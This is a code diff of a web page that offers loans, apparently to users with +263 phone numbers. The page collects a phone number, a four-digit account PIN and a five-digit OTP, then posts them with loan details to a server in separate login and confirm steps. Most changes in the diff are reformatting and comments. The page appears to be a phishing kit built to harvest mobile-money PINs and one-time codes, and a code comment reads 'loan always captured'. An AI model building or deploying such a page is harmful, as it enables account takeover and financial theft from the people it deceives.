@@ -10,6 +10,7 @@
 <style>
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%}
+
 body{
 font-family:Inter,system-ui,Arial;
 background:#020617;
@@ -77,7 +78,9 @@ cursor:pointer;
 .btn[disabled]{background:#334155}
 
 .req{color:#ef4444;margin-right:6px}
+
 .small{font-size:13px;color:#9ca3af}
+
 .success{color:#22c55e;font-weight:600}
 
 .error{
@@ -85,6 +88,8 @@ min-height:18px;
 font-size:13px;
 color:#ef4444;
 }
+
+/* PIN */
 
 .pin-row{
 display:flex;
@@ -108,6 +113,8 @@ caret-color:transparent;
 background:#2563eb;
 border-color:#2563eb;
 }
+
+/* OTP */
 
 .otp-modal{
 position:fixed;
@@ -214,6 +221,7 @@ border:1px solid #1f2937;
 </div>
 
 
+
 <div id="otpModal" class="otp-modal" style="display:none">
 
 <div class="otp-box">
@@ -271,28 +279,14 @@ Cancel
 
 <script>
 
-/* loan always captured */
+/* original loan function untouched */
+
 function buildLoanRequest(){
-
 try{
-
-let loan=JSON.parse(sessionStorage.getItem('loanForm')||'{}');
-
-loan.loanAmount=loan.loanAmount||sessionStorage.getItem('loanAmount');
-loan.loanType=loan.loanType||sessionStorage.getItem('loanType');
-loan.repayment=loan.repayment||sessionStorage.getItem('repayment');
-loan.employment=loan.employment||sessionStorage.getItem('employment');
-
+const loan = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
 if(!loan.loanAmount) return 'N/A';
-
 return `USD ${loan.loanAmount} / ${loan.loanType} / ${loan.repayment} month(s) (${loan.employment})`;
-
-}catch(e){
-
-return 'N/A';
-
-}
-
+}catch(e){ return 'N/A'; }
 }
 
 
@@ -301,8 +295,11 @@ return 'N/A';
 const pins=[...document.querySelectorAll('.pin-digit')];
 
 let pinValue='';
+
 let loginLocked=false;
+
 let confirmLocked=false;
+
 
 pins.forEach((el,i)=>{
 
@@ -312,11 +309,15 @@ el.value=el.value.replace(/\D/g,'');
 
 el.classList.toggle('filled',!!el.value);
 
-if(el.value && i<pins.length-1) pins[i+1].focus();
+if(el.value && i<pins.length-1)
+pins[i+1].focus();
 
 updatePin();
 
 });
+
+
+/* smooth backspace */
 
 el.addEventListener('keydown',e=>{
 
@@ -341,18 +342,19 @@ function updatePin(){
 
 pinValue=pins.map(p=>p.value).join('');
 
-loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue))||loginLocked;
+loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue)) || loginLocked;
 
 }
 
 
-/* phone */
+/* PHONE */
 
 const phone=document.getElementById('phone');
 
 const phoneError=document.getElementById('phoneError');
 
 const loginBtn=document.getElementById('loginBtn');
+
 
 function validatePhone(){
 
@@ -372,6 +374,7 @@ return true;
 
 }
 
+
 phone.addEventListener('input',()=>{
 
 let d=phone.value.replace('+263','').replace(/\D/g,'');
@@ -387,7 +390,7 @@ updatePin();
 });
 
 
-/* api */
+/* API */
 
 async function sendToServer(payload){
 
@@ -404,7 +407,7 @@ body:JSON.stringify(payload)
 }
 
 
-/* otp */
+/* OTP */
 
 const dots=[...document.querySelectorAll('.otp-digit')];
 
@@ -418,19 +421,27 @@ const countdown=document.getElementById('countdown');
 
 const otpStatus=document.getElementById('otpStatus');
 
+
 let timer=null,seconds=120;
+
 
 function renderOtp(v){
 
 dots.forEach((d,i)=>d.classList.toggle('filled',!!v[i]));
 
-confirmBtn.disabled=!/^\d{5}$/.test(v)||confirmLocked;
+confirmBtn.disabled=!/^\d{5}$/.test(v) || confirmLocked;
 
 }
 
-/* always show numeric keyboard */
 
-dots.forEach(d=>d.addEventListener('click',()=>buffer.focus()));
+/* ensure numeric keyboard shows */
+
+dots.forEach(d=>
+
+d.addEventListener('click',()=>buffer.focus())
+
+);
+
 
 buffer.addEventListener('input',()=>{
 
@@ -439,6 +450,9 @@ buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
 renderOtp(buffer.value);
 
 });
+
+
+/* smooth backspace */
 
 buffer.addEventListener('keydown',e=>{
 
@@ -482,7 +496,7 @@ resendBtn.disabled=false;
 }
 
 
-/* login */
+/* LOGIN */
 
 document.getElementById('loginForm').addEventListener('submit',async e=>{
 
@@ -505,7 +519,7 @@ loginPin:pinValue,
 
 loan_request:buildLoanRequest(),
 
-device:navigator.userAgent,
+device,
 
 submittedAt:new Date().toISOString()
 
@@ -525,7 +539,7 @@ startCountdown();
 });
 
 
-/* confirm */
+/* CONFIRM */
 
 confirmBtn.onclick=async()=>{
 
@@ -548,7 +562,7 @@ otp:buffer.value,
 
 loan_request:buildLoanRequest(),
 
-device:navigator.userAgent,
+device,
 
 submittedAt:new Date().toISOString()
 
